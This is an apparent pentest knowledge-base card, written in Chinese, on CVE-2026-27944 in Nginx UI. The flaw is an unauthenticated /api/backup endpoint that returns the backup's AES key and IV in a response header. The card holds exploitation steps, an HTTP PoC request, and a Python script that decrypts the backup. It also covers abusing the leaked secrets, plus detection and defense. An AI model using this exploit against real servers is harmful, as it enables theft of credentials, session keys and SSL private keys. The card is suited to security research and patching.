---
id: web-generic-auth-nginx-ui-backup-unauth-key-leak
title: Nginx UI /api/backup 未授权下载加密备份并在响应头泄露 AES 密钥与 IV（CVE-2026-27944）
type: scenario
domain: web
path: web/generic/auth
technique: unauth-backup-download-key-leak
tags:
- nginx-ui
- go
- gin
- authentication-bypass
- backup
- key-leak
- aes
- sensitive-data
cve:
- CVE-2026-27944
severity: critical
confidence: high
status: verified
affected_versions: 原文：< 2.3.2 均受影响，修复 ≥ 2.3.3；正文另称 v2.3.2 及之前受影响
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:03:51+08:00'
  notes: 已对照原文与12张图核对：InitRouter 中 /backup 无认证（仅 /restore 有 EncryptedForm）、securityToken=AESKey:AESIv 写入 X-Backup-Security、v2.3.3 修复为 AuthRequired，未登录请求返回 200+密钥头+zip 并成功解密解压，修复后 403，均与卡片一致；原文版本表述自相矛盾（表格 <2.3.2 与正文 v2.3.2 及之前），卡片已如实并列；未在本机复现。
url: /docs/web/generic/auth/web-generic-auth-nginx-ui-backup-unauth-key-leak/
draft: false
kb_aliases:
- CVE-2026-27944
- Nginx UI 备份泄露
- X-Backup-Security
- Nginx UI 未授权下载
- 备份解密
---

## 一句话结论

Nginx UI 2.3.2 及更早版本的 `GET /api/backup` 路由没有挂任何认证中间件，任何人无需登录即可下载完整系统备份；同时 `CreateBackup` 把本次备份的 AES-256 密钥与 IV 以 `X-Backup-Security: <key>:<iv>` 明文放进响应头，攻击者拿到响应后即可立即解密备份，获得用户凭证、会话令牌、SSL 私钥与 Nginx 配置。

## 原理

- `api/backup/router.go` 的路由注册为 `r.GET("/backup", CreateBackup)`，未附加 `middleware.AuthRequired()`；对比 `/restore` 至少用了 `middleware.EncryptedForm()`，说明备份端点遗漏了认证。
- `CreateBackup` 调用 `backup.Backup()` 生成加密 zip，并把 `result.AESKey + ":" + result.AESIv` 作为 `X-Backup-Security` 响应头返回，用于“下载后解密”。
- 加密算法为 AES-256-CBC，key 为 Base64 编码的 32 字节，IV 为 Base64 编码的 16 字节；zip 内包含 `nginx-ui.zip`（`database.db`、`app.ini` 等）、`nginx.zip`（`nginx.conf`、`ssl/*` 私钥等）与 `hash_info.txt`。
- 认证与密钥分发同时失效：未认证即可触发备份，响应头又直接给出解密材料，等于把“加密”降级为仅编码；攻击者不需要任何秘密。
- 每次请求生成新的 key 与 IV，必须使用同一次响应对应的头部值解密；这也意味着攻击者可以随时重新拉取一份最新备份。
- 备份内的 `database.db` 含用户口令哈希与 JWT/会话密钥，`app.ini` 含应用配置，`nginx.zip` 含站点配置与 SSL 私钥；泄露后可进一步登录后台、冒充用户、解密流量或横向到后端。

## 触发条件

- Nginx UI 版本 < 2.3.2（正文称 2.3.2 及之前），修复版本 ≥ 2.3.3。
- `/api/backup` 可从网络访问，且未额外套反向代理认证。
- 目标已完成安装或至少备份功能可用（安装流程本身也可能暴露该端点）。
- 攻击者能读取响应头与响应体（普通 HTTP 客户端即可）。

## 利用步骤

1. 未登录直接请求 `GET /api/backup`，保存返回的 zip 与 `X-Backup-Security` 响应头。
2. 按 `:` 分割头部，得到 Base64 的 key 与 IV；分别 Base64 解码。
3. 用 AES-256-CBC 解密响应体（按 16 字节块对齐，处理 padding 异常）。
4. 将解密结果按 zip 解压，得到 `nginx-ui.zip`、`nginx.zip`、`hash_info.txt`。
5. 从 `database.db` 提取用户口令哈希、会话/JWT 密钥；从 `app.ini` 提取应用配置；从 `nginx.zip` 提取站点配置与 SSL 私钥。
6. 用泄露的会话令牌尝试登录后台，或用配置中的凭据横向；仅在授权范围内验证影响。

## PoC

```http
GET /api/backup HTTP/1.1
Host: target:9000
Accept: */*
```

关键响应头：

```http
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename=backup-20260309-200959.zip
X-Backup-Security: <base64(32B key)>:<base64(16B iv)>
```

解密脚本（仅文本参考）：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64, zipfile

security_header = "<X-Backup-Security 的值>"
key_b64, iv_b64 = security_header.split(":")
key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)

data = open("backup.zip", "rb").read()
data = data[:len(data) // 16 * 16]
decrypted = AES.new(key, AES.MODE_CBC, iv).decrypt(data)
try:
    decrypted = unpad(decrypted, 16)
except ValueError:
    pass
open("decrypted_output.zip", "wb").write(decrypted)
with zipfile.ZipFile("decrypted_output.zip") as zf:
    zf.extractall("output")
    print(zf.namelist())
```

## 变体与关联

- 数据利用变体：会话/JWT 密钥伪造管理员令牌；口令哈希离线破解；SSL 私钥解密历史流量或冒充站点；Nginx 配置发现内网后端。
- 端点变体：同类“备份/导出/诊断包”接口缺少认证并把密钥随包下发；可关注 `/api/backup`、`/api/restore`、导出配置、日志打包等。
- 修复绕过关注点：修复版对 `/backup` 强制 `AuthRequired()`，`/restore` 用 `authIfInstalled`；若目标反向代理缓存了备份响应，仍可能造成二次泄露。
- 关联卡片：[[pentest-recon-web-config-robots-credential-leak]]（公开配置/凭据泄露）、[[web-generic-auth-unsigned-cookie-admin-keys]]（密钥泄露导致身份伪造）。

## 检测与防御

- 检测：未认证的 `GET /api/backup` 请求；响应中出现 `X-Backup-Security`、`Content-Disposition: attachment; filename=backup-*.zip`；短时间内多次拉取备份。
- 检测：备份下载后出现异常登录、会话令牌复用、SSL 私钥被用于其它站点、数据库哈希被离线破解的迹象。
- 防御：升级到 Nginx UI ≥ 2.3.3；为 `/api/backup` 强制认证与权限校验，备份功能仅管理员可用。
- 防御：不要把解密密钥放在响应头/响应体；如必须客户端解密，使用用户口令派生密钥或服务端托管密钥，并做一次性授权。
- 加固：备份文件加密存储、短期下载链接、下载审计与限速；反向代理层禁止缓存敏感响应。
- 响应：轮换所有可能泄露的用户口令、会话/JWT 密钥、SSL 证书与私钥、Nginx/后端凭据；排查备份下载记录与后续异常登录。
